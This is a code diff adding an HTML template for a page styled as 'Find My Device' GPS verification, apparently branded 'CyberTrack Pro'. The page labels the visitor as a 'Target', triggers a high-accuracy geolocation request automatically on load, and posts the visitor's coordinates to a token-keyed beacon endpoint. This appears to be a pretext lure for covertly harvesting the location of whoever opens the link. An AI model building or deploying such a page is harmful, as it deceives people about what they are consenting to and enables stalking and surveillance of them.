@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find My Device - Location Synchronization</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        body {
+            background: #0b0f19;
+            font-family: 'Rubik', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        .ping-card {
+            background: #111827;
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+            max-width: 440px;
+            width: 100%;
+        }
+        .text-cyan { color: #00f0ff !important; }
+        .radar-beacon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(0, 240, 255, 0.1);
+            border: 2px solid #00f0ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem auto;
+            position: relative;
+        }
+        .radar-beacon::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid #00f0ff;
+            animation: pulse-ring 2s infinite;
+        }
+        @keyframes pulse-ring {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.8); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="ping-card p-4 text-center">
+        <div class="radar-beacon">
+            <i class="fa-solid fa-satellite-dish text-cyan fs-3"></i>
+        </div>
+
+        <h4 class="fw-bold text-white mb-1">Find My Device</h4>
+        <p class="text-secondary fs-7 mb-3">Hardware GPS Location Verification</p>
+
+        <div class="p-3 mb-4 rounded bg-dark border border-secondary border-opacity-25 text-start font-monospace fs-8">
+            <div class="text-secondary">Target: <strong class="text-white">{{ record.query_identifier }}</strong></div>
+            <div class="text-secondary">Platform: <span class="text-cyan">{{ record.get_target_type_display }}</span></div>
+            <div class="text-secondary">Model: <span class="text-white">{{ record.device_model|default:'Smartphone' }}</span></div>
+        </div>
+
+        <div id="statusBox" class="alert alert-info border-cyan bg-dark-cyan text-cyan fs-8 mb-4">
+            <i class="fa-solid fa-location-crosshairs me-1"></i>
+            <span>Tap below to authorize hardware GPS location ping.</span>
+        </div>
+
+        <button id="sendGpsBtn" class="btn btn-primary btn-lg w-100 fw-bold py-3" style="background: linear-gradient(135deg, #00d2ff, #0077ff); border: none;">
+            <i class="fa-solid fa-location-arrow me-2"></i> Transmit High-Accuracy GPS
+        </button>
+
+        <div id="coordsBox" class="mt-4 p-3 rounded bg-black d-none font-monospace fs-8 text-start border border-success">
+            <div class="text-success fw-bold mb-1"><i class="fa-solid fa-circle-check me-1"></i> GPS Coordinates Synchronized!</div>
+            <div class="text-white" id="outLat"></div>
+            <div class="text-white" id="outLng"></div>
+            <div class="text-cyan" id="outAcc"></div>
+        </div>
+
+        <p class="text-secondary fs-9 mt-4 mb-0">
+            Powered by CyberTrack Pro Find My Device Grid. Encrypted telemetry.
+        </p>
+    </div>
+
+    <script>
+        const btn = document.getElementById('sendGpsBtn');
+        const statusBox = document.getElementById('statusBox');
+        const coordsBox = document.getElementById('coordsBox');
+
+        function transmitCoordinates() {
+            if (!navigator.geolocation) {
+                statusBox.className = 'alert alert-danger fs-8 mb-4';
+                statusBox.innerHTML = '<i class="fa-solid fa-triangle-exclamation me-1"></i> Geolocation is not supported by your browser.';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span> Locking onto GNSS Satellite Signal...';
+            statusBox.className = 'alert alert-warning fs-8 mb-4';
+            statusBox.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> Acquiring high-precision GPS fix. Please allow location access if prompted.';
+
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    const altitude = pos.coords.altitude;
+
+                    statusBox.innerHTML = `<i class="fa-solid fa-upload me-1"></i> Transmitting location (precision: ±${Math.round(accuracy)}m)...`;
+
+                    try {
+                        const res = await fetch('/api/beacon-report/{{ token }}/', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                latitude: lat,
+                                longitude: lng,
+                                accuracy: accuracy,
+                                altitude: altitude
+                            })
+                        });
+                        const data = await res.json();
+                        if (data.success) {
+                            statusBox.className = 'alert alert-success fs-8 mb-4';
+                            statusBox.innerHTML = '<i class="fa-solid fa-check-double me-1"></i> Location locked! Real-time telemetry synchronized with search console.';
+                            coordsBox.classList.remove('d-none');
+                            document.getElementById('outLat').textContent = `Latitude: ${lat.toFixed(6)}`;
+                            document.getElementById('outLng').textContent = `Longitude: ${lng.toFixed(6)}`;
+                            document.getElementById('outAcc').textContent = `Precision: ±${Math.round(accuracy)} meters`;
+                            btn.innerHTML = '<i class="fa-solid fa-check me-2"></i> Coordinates Transmitted';
+                        } else {
+                            throw new Error(data.error || 'Server rejected coordinates');
+                        }
+                    } catch (err) {
+                        statusBox.className = 'alert alert-danger fs-8 mb-4';
+                        statusBox.innerHTML = `<i class="fa-solid fa-circle-xmark me-1"></i> Sync Error: ${err.message}`;
+                        btn.disabled = false;
+                        btn.innerHTML = '<i class="fa-solid fa-rotate-right me-2"></i> Retry Sync';
+                    }
+                },
+                (err) => {
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-location-arrow me-2"></i> Transmit High-Accuracy GPS';
+                    statusBox.className = 'alert alert-danger fs-8 mb-4';
+                    statusBox.innerHTML = `<i class="fa-solid fa-triangle-exclamation me-1"></i> GPS Error: ${err.message}. Please enable Location Services in device settings.`;
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        btn.addEventListener('click', transmitCoordinates);
+        // Automatically attempt to prompt on page load
+        window.addEventListener('load', () => {
+            setTimeout(transmitCoordinates, 500);
+        });
+    </script>
+</body>
+</html>
